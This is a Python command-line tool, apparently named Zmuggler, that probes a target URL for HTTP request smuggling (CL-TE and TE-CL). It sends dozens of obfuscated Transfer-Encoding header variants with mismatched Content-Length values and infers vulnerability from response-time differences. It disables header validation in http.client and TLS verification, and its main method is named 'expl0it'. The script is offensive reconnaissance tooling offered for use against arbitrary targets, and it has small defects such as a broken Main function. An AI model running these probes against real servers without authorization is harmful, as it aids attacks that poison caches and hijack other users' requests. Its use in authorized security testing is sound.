#!/usr/bin/python3
from requests import Request, Session
from requests.exceptions import ReadTimeout
import urllib3, requests, collections, http.client, optparse, sys, os


print("""\033[1;36m
  _____                            _           
 |__  /_ __ ___  _   _  __ _  __ _| | ___ _ __ 
   / /| '_ ` _ \| | | |/ _` |/ _` | |/ _ \ '__|
  / /_| | | | | | |_| | (_| | (_| | |  __/ |   
 /____|_| |_| |_|\__,_|\__, |\__, |_|\___|_|   
                       |___/ |___/                                                                                              

| Zmuggler |
| @electronicbots |

\033[1;m""")

http.client._header_name = lambda x: True
http.client._header_value = lambda x: False
urllib3.disable_warnings()

class ZSmuggler():


    def __init__(self, url):
        self.url = url
        self.pheaders = []
        self.rheaders = []

    def genHeaders(self):
        transfer_encoding = list(
            [
                ["Transfer-Encoding", "chunked"],
                ["Transfer-Encoding ", "chunked"],
                ["Transfer_Encoding", "chunked"],
                ["Transfer Encoding", "chunked"],
                [" Transfer-Encoding", "chunked"],
                ["Transfer-Encoding", "  chunked"],
                ["Transfer-Encoding", "chunked"],
                ["Transfer-Encoding", "\tchunked"],
                ["Transfer-Encoding", "\u000Bchunked"],
                ["Content-Encoding", " chunked"],
                ["Transfer-Encoding", "\n chunked"],
                ["Transfer-Encoding\n ", " chunked"],
                ["Transfer-Encoding", " \"chunked\""],
                ["Transfer-Encoding", " 'chunked'"],
                ["Transfer-Encoding", " \n\u000Bchunked"],
                ["Transfer-Encoding", " \n\tchunked"],
                ["Transfer-Encoding", " chunked, cow"],
                ["Transfer-Encoding", " cow, "],
                ["Transfer-Encoding", " chunked\r\nTransfer-encoding: cow"],
                ["Transfer-Encoding", " chunk"],
                ["Transfer-Encoding", " cHuNkeD"],
                ["TrAnSFer-EnCODinG", " cHuNkeD"],
                ["Transfer-Encoding", " CHUNKED"],
                ["TRANSFER-ENCODING", " CHUNKED"],
                ["Transfer-Encoding", " chunked\r"],
                ["Transfer-Encoding", " chunked\t"],
                ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                ["Transfer\r-Encoding", " chunked"],
                ["barn\n\nTransfer-Encoding", " chunked"],
            ])
        for x in transfer_encoding:
            headers = collections.OrderedDict()
            headers[x[0]] = x[1]
            headers['Cache-Control'] = "no-cache"
            headers['Content-Type'] = "application/x-www-form-urlencoded"
            headers['User-Agent'] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
            self.pheaders.append(headers)

    def resptime(self, headers={}, payload=""):
        s = Session()
        req = Request('POST', self.url, data=payload)
        prepped = req.prepare()
        prepped.headers = headers
        resp_time = 0
        try:
            resp = s.send(prepped, verify=False, timeout=10)
            resp_time = resp.elapsed.total_seconds()
            

        except Exception as e:
            if isinstance(e, ReadTimeout):
                resp_time = 10

        return resp_time

    def calcT(self, L_Bigtime, P_Bigtime, L_Smalltime, P_Smalltime):
        for headers in self.pheaders:
            headers['Content-Length'] = L_Bigtime
            big_time = self.resptime(headers, P_Bigtime)
            if not big_time:
                big_time = 0
            if big_time < 5:
                continue

            headers['Content-Length'] = L_Smalltime
            small_time = self.resptime(headers, P_Smalltime)
            if not small_time:
                small_time = 1
            if big_time > 5 and big_time / small_time >= 5:
                self.valid = True
                self.type = "CL-TE"
                self.rheaders = [headers]
                return True
        return False

    def Bcheck(self):
        header = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
        }
        try:
            resp = requests.get(self.url, headers=header, verify=False, timeout=10)
            if resp.status_code == 200:
                return True
            else:
                return False
        except Exception as error:
            print(error)

    def checkCLTE(self):
        result = self.calcT(4, "1\r\nA\r\nS\r\n\r\n\r\n", 11, "1\r\nA\r\nS\r\n\r\n\r\n")
        return result

    def checkTECL(self):
        result = self.calcT(6, "0\r\n\r\nX", 5, "0\r\n\r\n")
        return result

    def expl0it(self):
        if self.Bcheck():
            self.genHeaders()
            try:
                result = self.checkCLTE()
                flag = "CLTE"
                if not result:
                    result = self.checkTECL()
                    flag = "TECL"
                if result:
                    print("\033[1;31m" + "\033[1;m\033[1;32m[+] Found possible " + flag)
                    self.recheck(flag)
            except Exception as e:
                print(e)
                print("timeout: " + self.url)
        else:
            print('\033[1;31m' + "[-] can't access target" + '\033[1;m')

    def recheck(self, flag):
        print("[+] Checking again...")
        result = False
        if flag == "CLTE":
            result = self.checkCLTE()
        if flag == "TECL":
            result = self.checkTECL()
        if result:
            payloadkey = list(self.rheaders[0])[0]
            payloadV = self.rheaders[0][payloadkey]
            payload = str([payloadkey, payloadV])
            print(flag, payload)

    def Main():
        arguments = Args()
        if '--target' in str(sys.argv):
            target = (arguments.filepath)
            hrs = ZSmuggler(target)
            hrs.expl0it()
        else:
            print("Try ./Zmuggler.py --help")

def Args():
    Parser = optparse.OptionParser()
    group = optparse.OptionGroup(Parser, "Grouped arguments")
    group.add_option('--target' , dest='link', help = 'Path to the target URL')
    Parser.add_option_group(group)
    (arguments, values) = Parser.parse_args()
    return arguments


if __name__ == '__main__':
    arguments = Args()
    if '--target' in str(sys.argv):
        target = (arguments.link)
        hrs = ZSmuggler(target)
        hrs.expl0it()
    else:
        print("Try ./Zmuggler.py --help")
